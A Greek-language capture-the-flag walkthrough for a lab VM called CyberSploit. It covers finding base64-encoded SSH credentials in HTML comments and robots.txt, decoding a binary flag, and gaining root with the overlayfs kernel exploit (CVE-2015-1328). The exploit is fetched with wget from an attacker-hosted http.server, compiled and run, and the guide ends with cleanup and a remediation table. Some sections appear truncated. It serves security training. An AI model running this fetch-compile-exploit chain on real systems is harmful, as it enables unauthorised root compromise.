## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή διδάσκει **δύο δεξιότητες που λείπουν από το Μηχάνημα 1**:

1. **Τη ροή έρευνας.** Από ένα banner (`Linux 3.13.0-32-generic`) → `searchsploit` → ανάγνωση
   του `.c` αρχείου → μεταφορά → μεταγλώττιση → εκτέλεση → καθαρισμός. Αυτή είναι η πιο
   επαναλαμβανόμενη ροή σε ολόκληρη τη διαδρομή, και εδώ την κάνετε **χειροκίνητα**, χωρίς
   Metasploit να την κρύβει.
2. **Τη διάκριση κωδικοποίησης από κρυπτογράφηση.** Ολόκληρο το μηχάνημα είναι χτισμένο πάνω σε
   **base64 και δυαδικό** — δηλαδή σε απόκρυψη που **δεν προστατεύει τίποτα**.

Επιπλέον, είναι **σκόπιμα μικρό**: μόνο δύο ανοιχτές θύρες. Αυτό σας αναγκάζει να κοιτάξετε
**μέσα στο περιεχόμενο** αντί για μια εξωτική υπηρεσία — η συνήθεια που κερδίζει τα Μηχανήματα
6, 7, 9 και 13.

## Στόχοι μάθησης

1. Να ερμηνεύσετε μια **σκόπιμα μικρή** σάρωση και να αλλάξετε μέθοδο ανάλογα.
2. Να βρείτε πληροφορίες σε **σχόλια HTML** — πράγμα που ο φυλλομετρητής **κρύβει**.
3. Να **αναγνωρίσετε μορφές κωδικοποίησης από το σύνολο χαρακτήρων** και να αποκωδικοποιήσετε
   **τοπικά**.
4. Να εκτελέσετε την πλήρη ροή **έρευνας → μεταφοράς → μεταγλώττισης → εκτέλεσης**.
5. Να καταλάβετε τι είναι το **overlayfs (CVE-2015-1328)** και το **Dirty COW (CVE-2016-5195)**.
6. Να **καθαρίσετε** τα ίχνη ενός kernel exploit (`/etc/ld.so.preload`).

## Πριν ξεκινήσετε — απαντήστε

1. Αν η σάρωση δείξει **μόνο δύο** ανοιχτές θύρες, τι αλλάζει στη μέθοδό σας;
2. Πώς διακρίνετε **base64** από **δυαδικό** χωρίς κανένα εργαλείο;
3. Γιατί **δεν** αποκωδικοποιείτε δεδομένα πελάτη σε online εργαλείο;
4. Ποια τρία πράγματα πρέπει να ελέγξετε **πριν** μεταγλωττίσετε ένα exploit που κατεβάσατε;

Οι δύο ανοιχτές θύρες είναι **22** και **80**. Το SSH δεν έχει ευπάθεια έκδοσης εδώ. Άρα **όλη η
είσοδος είναι μέσα στη σελίδα** — και συγκεκριμένα μέσα στον **πηγαίο κώδικα** της, σε σχόλια

`Ctrl+U`, ή καλύτερα `curl -s http://TARGET/ | grep -iE '<!--'`.
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
1. Σχόλια HTML στο /        → username (itsskv) + base64 blob
2. /robots.txt              → δεύτερο base64 blob σε σχόλιο
3. Αποκωδικοποίηση τοπικά   → σημαία 1 + κωδικός SSH
4. ssh itsskv@TARGET        → flag2.txt σε ΔΥΑΔΙΚΟ
5. Μετατροπή δυαδικού       → σημαία 2
6. uname -a + searchsploit  → overlayfs 37292.c
7. http.server + wget + gcc → root
```

**Το κρίσιμο άλμα είναι το βήμα 3 → 4:** η αποκωδικοποιημένη συμβολοσειρά **δεν είναι σημαία
μόνο** — είναι **ο κωδικός SSH**. Αυτή είναι η *συμπερασματική εξαγωγή διαπιστευτηρίων*: ένα
μυστικό που βρέθηκε σε ένα μέρος χρησιμοποιείται σε άλλο.
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — αναγνώριση μορφών κωδικοποίησης</strong></summary>

| Σύνολο χαρακτήρων | Μορφή |
| --- | --- |
| `A–Z a–z 0–9 + /` με `=` ή `==` | **base64** |
| Μόνο `0` και `1`, χωρισμένα με κενά, **ομάδες των 8** | **δυαδικό (ASCII)** |
| Μόνο `A–Z 2–7` με `=` | **base32** |
| Μόνο `0–9a-f`, άρτιο μήκος | **δεκαεξαδικό** |
| Μόνο `+ - < > . , [ ]` | **Brainfuck** (Μηχάνημα 8) |

```bash
printf '%s' 'BLOB' | base64 -d ; echo
python3 -c "import sys;print(''.join(chr(int(b,2)) for b in sys.argv[1].split()))" "$(cat flag2.txt)"
```

**Πάντα ελέγξτε αν το αποτέλεσμα είναι ΕΠΙΣΗΣ κωδικοποιημένο.** Εδώ το base64 δίνει **σημαία σε
μορφή `cybersploit{…}`** — δηλαδή τελικό κείμενο, τέλος της αλυσίδας.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — η ροή του kernel exploit</strong></summary>

```text
ΣΤΟΝ KALI:  python3 -m http.server 8000        (στον φάκελο με το 37292.c)
ΣΤΟΝ ΣΤΟΧΟ: wget http://ATTACKER:8000/37292.c -O ofs.c
ΚΑΙ ΣΤΙΣ ΔΥΟ: md5sum <αρχείο>                  (πρέπει να ταιριάζουν!)
ΣΤΟΝ ΣΤΟΧΟ: gcc ofs.c -o ofs && ./ofs
```

Αν η `gcc` αποτύχει, οι συνήθεις αιτίες είναι: λείπει `#include`, χρειάζεται
`-lcrypto -lssl`, ή υποστήριξη 32-bit. **Διαβάστε το σφάλμα, μην ξανακατεβάσετε το αρχείο.**

Αν το `./ofs` τυπώσει `created: /tmp/tmp.XXXX` και μετά `#`, **πετύχατε**.
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί το base64 «που προστατεύει έναν κωδικό» είναι εύρημα και όχι άμυνα;</summary>

Επειδή το base64 είναι **κωδικοποίηση, όχι κρυπτογράφηση**: υπάρχει για να επιζούν δυαδικά
δεδομένα σε μέσα που μεταφέρουν μόνο κείμενο. Είναι **τετριμμένα αντιστρέψιμο χωρίς κλειδί** —
`base64 -d`. Άρα δεν προσφέρει **καμία** εμπιστευτικότητα. Το να βλέπετε κωδικό «κρυμμένο» σε
base64 σημαίνει ότι κάποιος **νόμιζε** ότι τον προστάτευε.
</details>

<details>
<summary><b>2.</b> Ποια η διαφορά μεταξύ του kernel exploit και της αναβάθμισης μέσω κακής ρύθμισης;</summary>

Το **kernel exploit** εκμεταλλεύεται **bug στον πυρήνα** — απαιτεί συγκεκριμένη έκδοση,
μεταγλώττιση, και μπορεί να ρίξει το μηχάνημα. Η **κακή ρύθμιση** (SUID, capabilities,
world-writable αρχείο) είναι **σωστά λειτουργούν λογισμικό με λάθος δικαιώματα** — είναι
αξιόπιστη, αθόρυβη, και δεν εξαρτάται από την έκδοση. **Σε πραγματικό έργο προτιμάτε πάντα τη
δεύτερη.**
</details>

<details>
<summary><b>3.</b> Τι είναι το <code>/etc/ld.so.preload</code> και γιατί πρέπει να το διαγράψετε;</summary>

Είναι το αρχείο που λέει στον **dynamic linker** να εισάγει συγκεκριμένες βιβλιοθήκες σε
**κάθε δυναμικά συνδεδεμένη διεργασία** του συστήματος. Το overlayfs exploit το χρησιμοποιεί
για να επιβάλει την προνομιακή του βιβλιοθήκη. **Αν το αφήσετε**, κάθε πρόγραμμα που τρέχει
μετά — συμπεριλαμβανομένων των εργαλείων του διαχειριστή — φορτώνει τον δικό σας κώδικα, και
το σύστημα μπορεί να γίνει ασταθές. Είναι **το πιο επικίνδυνο αντικείμενο για καθαρισμό** σε
ολόκληρη τη διαδρομή.
</details>

<details>
<summary><b>4.</b> Γιατί ελέγχετε <code>md5sum</code> και στις δύο πλευρές;</summary>

Επειδή ένα **μερικώς κατεβασμένο** αρχείο δίνει σφάλμα μεταγλώττισης που **μοιάζει με bug στον
κώδικα του exploit** — και θα σπαταλήσετε ώρα διορθώνοντας σωστό κώδικα. Η σύγκριση δύο
δεκαεξαδικών συμβολοσειρών διαρκεί **δύο δευτερόλεπτα** και αποκλείει ολόκληρη κατηγορία
προβλημάτων.
</details>

<details>
<summary><b>5.</b> Τι σας λέει το <code>groups=0(root),1000(itsskv)</code> στην έξοδο του <code>id</code>;</summary>

Ότι η αναβάθμιση έγινε **μέσω του ίδιου σας του λογαριασμού**: το kernel exploit εκτελέστηκε
υπό τον `itsskv` και **άλλαξε το effective UID σε 0**, διατηρώντας τις αρχικές ομάδες. Διαφέρει
από μια **σύνδεση** root (`uid=0 gid=0 groups=0` μόνο) — και η διαφορά είναι ορατή στο
auditing, γιατί η αρχική ταυτότητα παραμένει καταγεγραμμένη.
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Σχόλια HTML με διαπιστευτήρια** | Ποτέ μυστικά σε σχόλια. Scrubber στη δομή (π.χ. minifier που αφαιρεί σχόλια) |
| **Κωδικοποίηση ως προστασία** | Εκπαίδευση: base64 **δεν** είναι κρυπτογράφηση. Έλεγχος κώδικα για «κρυμμένα» μυστικά |
| **Κωδικός σε `robots.txt`** | Το `robots.txt` είναι **δημόσιο εξ ορισμού**. Ποτέ μυστικά εκεί |
| **`flag2.txt` mode 664** | `chmod 600`. Έλεγχος δικαιωμάτων σε όλα τα αρχεία με μυστικά |
| **Kernel 3.13 σε Ubuntu 14.04** | **`unattended-upgrades`**. Το Ubuntu 14.04 έληξε τον Απρίλιο 2019 — το μηχάνημα δεν πρέπει καν να είναι σε παραγωγή |
| **`gcc` διαθέσιμος στον στόχο** | Αφαιρέστε εργαλεία μεταγλώττισης από εξυπηρετητές |
| **Εξερχόμενη σύνδεση προς τον επιτιθέμενο** | **Egress filtering** — ο χρήστης δεν πρέπει να μπορεί να φέρει αρχείο από το internet |

**Το μεγαλύτερο δίδαγμα:** *η απόκρυψη δεν είναι εμπιστευτικότητα.* Τίποτα σε αυτό το
μηχάνημα δεν ήταν κρυπτογραφικά προστατευμένο — όλα ήταν απλώς **άβολα**. Και η αβολία νικάται
με μία εντολή.

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = το VM-θύμα, `ATTACKER` = ο Kali σας στο δίκτυο host-only.

### 1. Μια σκόπιμα μικρή σάρωση

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/cybersploit TARGET
```

```text
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 61:3b:4b:9c:a5:3d:bd:cb:2c:d3:8e:4d:1c:5c:9b:2f (DSA)
|_  2048 b2:4c:3a:2e:5c:8f:6b:1a:9d:0e:7f:2c:1b:8a:4d:3e (RSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: CyberSploit
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`65535 − 65533 = 2` ανοιχτές θύρες. **Μια μικρή επιφάνεια επίθεσης αλλάζει τη μέθοδό σας:** δεν
υπάρχει ασυνήθιστη υπηρεσία να εκμεταλλευτείτε, άρα η πληροφορία που χρειάζεστε είναι **μέσα στο
περιεχόμενο** που σερβίρουν αυτές οι δύο υπηρεσίες.

**`1024 … (DSA)` είναι εύρημα από μόνο του** — ένα **καταργημένο 1024-bit DSA host key**. Το DSA
περιορίζεται στα 1024 bit από το ίδιο το πρότυπο, γι' αυτό το OpenSSH το απενεργοποίησε εξ
ορισμού. Το `Apache/2.4.7 (Ubuntu)` καρφιτσώνει τη διανομή ως **Ubuntu 14.04**, της οποίας η
κανονική υποστήριξη έληξε τον Απρίλιο του 2019.

### 2. Ανάγνωση του πηγαίου κώδικα της σελίδας

```bash
curl -s http://TARGET/ | grep -iE 'comment|<!--|itsskv|base64'
```

```text
<!-- username : itsskv -->
<!-- aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA== -->
```

`curl -s` τυπώνει την ακατέργαστη HTML χωρίς μπάρα προόδου. **Ο φυλλομετρητής το κρύβει αυτό:**
τα σχόλια δεν αποδίδονται ποτέ, άρα το `Ctrl+U` ή η `curl` είναι ο **μόνος** τρόπος να τα δείτε.

**Δύο σχόλια, και το δεύτερο είναι base64** — αναγνωρίσιμο από το σύνολο χαρακτήρων
(`A–Z a–z 0–9 + /`) και το **`==`** στο τέλος για συμπλήρωμα. Το πρώτο σας δίνει **όνομα
χρήστη**· το δεύτερο μοιάζει με URL (`aHR0c` αποκωδικοποιείται σε `http`) — **και μόνο από το
πρώτο τετράδυο μπορείτε να το μαντέψετε**.

### 3. `robots.txt` και αποκωδικοποίηση τοπικά

```bash
curl -s http://TARGET/robots.txt
```
```text
User-agent: *
Disallow: /
# y3licGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
```

```bash
printf '%s' 'y3licGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=' | base64 -d; echo
```
```text
cybersploit{youtube.com/c/cybersploit}
```

**`printf '%s'` γράφει ακριβώς αυτά τα bytes.** Το `echo '…' | base64 -d` προσθέτει πρώτα ένα
newline, που εισάγει ένα άσχετο byte και **σπάει κάθε ακριβή σύγκριση**.

**Αποκωδικοποιήστε τοπικά, ποτέ σε online εργαλείο:** η επικόλληση δεδομένων πελάτη σε
ιστοσελίδα τρίτου είναι **σφάλμα διαχείρισης δεδομένων**, και σε πραγματικό έργο θα ήταν
διαρροή πληροφοριών πελάτη — πιθανώς και παραβίαση συμβολαίου.

Η αποκωδικοποιημένη συμβολοσειρά είναι η **σημαία 1** — και, όπως αποδεικνύεται, **ο κωδικός
SSH**. Αυτό είναι *συμπερασματική εξαγωγή διαπιστευτηρίων*.

### 4. Σύνδεση

```bash
ssh itsskv@TARGET
```
```text
itsskv@cybersploit1:~$ ls -la
-rw-rw-r-- 1 itsskv itsskv  224 Jul  9  2020 flag2.txt
itsskv@cybersploit1:~$ cat flag2.txt
01100011 01111001 01100010 01100101 …
```

**`-rw-rw-r--` (mode `664`)** σημαίνει ότι **ομάδα και άλλοι μπορούν να το διαβάσουν** — εύρημα,
αφού περιέχει διαπιστευτήριο. Τα περιεχόμενα είναι **δυαδικά**: ομάδες οκτώ `0` και `1`
χωρισμένες με κενά. **Αυτή είναι διαφορετική κωδικοποίηση από το base64**, και η αναγνώριση της
διαφοράς είναι η δεξιότητα.

```bash
python3 -c "import sys;print(''.join(chr(int(b,2)) for b in sys.argv[1].split()))" "$(cat flag2.txt)"
```
```text
cybersploit{https:t.me/cybersploit1}
```

**Ανάλυση της μιας γραμμής:** `sys.argv[1].split()` χωρίζει στα κενά → οκταδικές ομάδες των 8 ·
`int(b,2)` μεταφράζει κάθε ομάδα ως **δυαδικό** αριθμό · `chr()` μετατρέπει τον ακέραιο σε
χαρακτήρα · `''.join(...)` τους ενώνει. **Σημαία 2.**

**Ο `$(cat flag2.txt)` είναι υποκατάσταση εντολής** — το περιεχόμενο του αρχείου γίνεται
όρισμα. Χρησιμοποιήστε **διπλά** εισαγωγικά γύρω του, ώστε τα κενά να διατηρηθούν ως μέρος **ενός**
ορίσματος.

```text
---------------------------------------------------------------------------
 Exploit Title                                                     |  Path
---------------------------------------------------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04) - 'overlayfs' LPE  | linux/local/37292.c
Linux Kernel 4.4.0 < 4.8.0 (Ubuntu 16.04) - 'Dirty COW' Race Cond   | linux/local/40616.c
---------------------------------------------------------------------------
```

**Το `uname -a` δίνει τρία πράγματα, και τα τρία έχουν σημασία:** την **έκδοση κυκλοφορίας**
kernel (`3.13.0-32-generic`), το **πακέτο της διανομής** (`#57-Ubuntu SMP` → Ubuntu 14.04), και
την **αρχιτεκτονική** (`x86_64`). Ένα exploit για `3.13.0` σε i386 **δεν** θα δουλέψει εδώ.

**Το `searchsploit` ταιριάζει σε *συμβολοσειρές***, άρα θα προτείνει και exploits για kernels που
δεν έχετε. **Αυτό που ελέγχετε είναι το εύρος στον τίτλο** (`3.13.0 < 3.19`). Το `-m`
κατοπτρίζει την καταχώρίση στον τρέχοντα φάκελο.

**Το `less` πριν το `run` είναι μη διαπραγματεύσιμο.** Τι ψάχνετε μέσα στο `.c`: ποιες
μεταβλητές πρέπει να αλλάξετε, αν χρειάζεται συγκεκριμένο flag μεταγλώττισης, αν καθαρίζει μετά
από μόνο του, και **τι τυπώνει στην επιτυχία** — ώστε να αναγνωρίσετε το `#` prompt.

### 6. Μεταφορά, μεταγλώττιση, εκτέλεση

```bash
python3 -m http.server 8000                                  # στον ATTACKER, στον φάκελο του exploit
wget http://ATTACKER:8000/37292.c -O ofs.c                   # στον ΣΤΟΧΟ
md5sum ofs.c                                                 # ΚΑΙ ΣΤΑ ΔΥΟ μηχανήματα
gcc ofs.c -o ofs && ./ofs
id
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.56.102 - - [11/May/2024 15:02:44] "GET /37292.c HTTP/1.1" 200 -
```
```text
9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c  ofs.c
```
```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
created: /tmp/tmp.UxYz3k
# id
uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
```

**Το `0.0.0.0` στο μπάνερ του εξυπηρετητή** σημαίνει ότι δεσμεύτηκε σε **όλες** τις διεπαφές,
άρα ο στόχος μπορεί να σας φτάσει. Αν έλεγε `127.0.0.1`, **δεν θα μπορούσε**. Η γραμμή
καταγραφής της αίτησης είναι η επιβεβαίωσή σας, και το **`200`** σημαίνει ότι σερβίρατε το
αρχείο επιτυχώς.

**Το ταυτόσημο `md5sum` και στις δύο πλευρές αποδεικνύει ότι η μεταφορά ήταν άθικτη.** Αξίζει
δύο δευτερόλεπτα, γιατί ένα κομμένο κατέβασμα δίνει σφάλμα `gcc` που **μοιάζει με bug στο
exploit**.

**Διαβάστε την έξοδο του overlayfs ως αφήγηση σταδίων:** το exploit προσαρτά `overlayfs` με
τρόπο που επιτρέπει σε μη προνομιούχο χρήστη να δημιουργήσει **setuid binary**. Ανακοινώνει κάθε
στάδιο (`spawning threads`, `mount #1`, `mount #2`) και σημειώνει **`/etc/ld.so.preload created`**
— **ένα αντικείμενο που ΠΡΕΠΕΙ να αφαιρέσετε μετά**, γιατί εισάγει βιβλιοθήκη σε κάθε δυναμικά
συνδεδεμένη διεργασία του συστήματος.

### 7. Η τελική σημαία και ο καθαρισμός

```bash
rm -f /tmp/ofs /tmp/ofs.c /etc/ld.so.preload /tmp/tmp.*

```

```text
ls: cannot access '/etc/ld.so.preload': No such file or directory
```

κανόνας του καθαρισμού: **διαγράψτε και μετά επαληθεύστε**. Χωρίς την επαλήθευση, δεν ξέρετε αν
αφήσατε πίσω σας έναν μηχανισμό που θα έσπαγε το μηχάνημα στην επόμενη εκκίνηση.
